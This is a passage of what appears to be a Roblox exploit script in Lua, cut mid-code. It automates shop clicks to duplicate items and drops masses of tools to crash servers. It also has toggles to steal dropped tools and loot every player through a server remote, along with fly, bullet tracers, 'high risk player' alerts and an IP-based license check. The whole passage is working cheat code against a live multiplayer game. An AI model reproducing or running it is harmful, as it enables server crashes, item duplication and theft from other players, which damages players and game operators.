	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") and v.Name == "Money Flex"  then
			v.Parent = game.Players.LocalPlayer.Character
            task.wait()
            v.Parent = workspace
		end
	end
	wait()
fireclickdetector(game.Workspace.IllegalDealer.ClickDetector)
game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false

local vim = game:GetService("VirtualInputManager")
local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame["Money Flex"]
game:GetService("RunService"):Set3dRenderingEnabled(false)

-- Interact with the shop
for i = 1, dupeamount * 1.3 do
    task.wait()
    vim:SendMouseButtonEvent(thing.AbsolutePosition.X + 20, thing.AbsolutePosition.Y + 80, 0, true, game, 0)
    task.wait()
    vim:SendMouseButtonEvent(thing.AbsolutePosition.X + 20, thing.AbsolutePosition.Y + 80, 0, false, game, 0)
end
game:GetService("RunService"):Set3dRenderingEnabled(true)

-- Exit the DealerGui
local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
vim:SendMouseButtonEvent(thing.AbsolutePosition.X + 20, thing.AbsolutePosition.Y + 80, 0, true, game, 0)
wait()
vim:SendMouseButtonEvent(thing.AbsolutePosition.X + 20, thing.AbsolutePosition.Y + 80, 0, false, game, 0)


local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:FindFirstChildOfClass("Humanoid")
local Health = Notif:Notify("Crash started, idea by @cursed4evr", 4, "information")
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") and v.Name == "Money Flex"  then
            v.Handle:Destroy()
			v.Parent = game.Players.LocalPlayer.Character
            task.wait()
            v.Parent = workspace
		end
	end
	wait()
    local toolCount = 0

for _, item in pairs(game.Workspace:GetChildren()) do
    if item:IsA("Tool") then
        toolCount = toolCount + 1
    end
end

print("Number of tools in the workspace: " .. toolCount)

end)
    end
    
    

    
        local toggle3843774 = gunsection.element('Toggle', 'Tool Stealing', false, function(v)
        _G.ToolStealing = v.Toggle
        while _G.ToolStealing do
            game:GetService("RunService").RenderStepped:wait()
            if game.Workspace:FindFirstChildOfClass("Tool") then
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Workspace:FindFirstChildOfClass("Tool"))
            end
        end
            end)

            local lootstealingshit = gunsection.element('Toggle', 'Loot Stealing', false, function(v)
                _G.LootStealing = v.Toggle
                while _G.LootStealing do
                    wait(0.5)
                    for i,v in pairs(game.Players:GetChildren()) do
                        spawn(function()
                            local args = {
                                [1] = v
                            }
                            
                            game:GetService("ReplicatedStorage"):WaitForChild("LootPlayerRF"):InvokeServer(unpack(args))
                        end)
                    end
                end
                    end)

    
 
    
    
    local amount2 = 32
    local itemname = ""
    
    local toggle = sector1.element('Button', 'Duplicate', false, function(v)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.SafeZones:GetChildren()[10].CFrame 
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)        
    end)
    wait(0.1)



    for i, v in pairs(game.Players:GetChildren()) do
        if v.Character then
            local head = v.Character:FindFirstChild("Head")
            if head then
                local nameGui = head:FindFirstChild("NameGui")
                if nameGui then
                    local main = nameGui:FindFirstChild("Main")
                    if main then
                        local extras = main:FindFirstChild("Extras")
                        if extras then
                            local str = extras.Text
                            if str ~= "" then
                                Notif:Notify(v.Name .. " has an emoji: " .. str, 4, "alert")
                            end
                        end
                    end
                end
            end
        end
    end

    local operating = false


    
    

    game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    wait(2)
    fly()
    end)

    
local function createBulletTracer(startPos, endPos)
    local TweenService = game:GetService("TweenService")
    local BulletTracers = Instance.new("Part")
    BulletTracers.Anchored = true
    BulletTracers.CanCollide = false
    BulletTracers.Material = Enum.Material.ForceField
    BulletTracers.Color = Color3.new(0.3921568627, 0.3921568627, 1)
    BulletTracers.Size = Vector3.new(0.1, 0.1, (startPos - endPos).magnitude)
    BulletTracers.CFrame = CFrame.new(startPos, endPos) * CFrame.new(0, 0, -BulletTracers.Size.Z / 2)
    BulletTracers.Name = tostring(math.random(1,10000000))
    BulletTracers.Parent = game.Workspace
    
    local tween = TweenService:Create(BulletTracers, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0), {Transparency = 1})
    tween:Play()
    tween.Completed:wait()
    BulletTracers:Destroy()
    
end


local function onMouseButton1Down()
    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()
    if mouse then
        local tool = player.Character:FindFirstChildOfClass("Tool")
        if tool then 
            if tool:FindFirstChild("Handle") then
                if tool.Handle:FindFirstChild("barrel") then
                    local startPos = tool.Handle.barrel.WorldPosition
                     local endPos = mouse.Hit.p
                     createBulletTracer(startPos, endPos)
                end
            end
        end
    end
end


game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    wait(2)
    fly()
    end)



game:GetService("UserInputService").InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        if _G.tracers then
        onMouseButton1Down()
        end
    end
end)

    local FinishedLoading = Notif:Notify("Loaded Loz's Dev.", 4, "information")
    wait(0.1)
    for i,v in pairs(game.Players:GetChildren()) do
        if v.Character then
             if v.Character:FindFirstChild("Head") then
             if v.Character.Head:FindFirstChild("NameGui") then
        local str = v.Character.Head.NameGui.Main.Level.Text
        local nums = string.gmatch(str, "%d+")
        for digit in nums do 
        if tonumber(digit) > 300 then
                local FinishedLoading = Notif:Notify(v.Name .. " is a high risk player.", 4, "alert")
        end
        end
        end
        end
    end
        end
    else
    local LoadingXSX = Notif:Notify("Unauthorized, please wait. " .. ip, 2, "error") 
    setclipboard(tostring(ip))
end
else
    local LoadingXSX = Notif:Notify("Script down.", 2, "alert") -- notification, alert, error, success, information

end
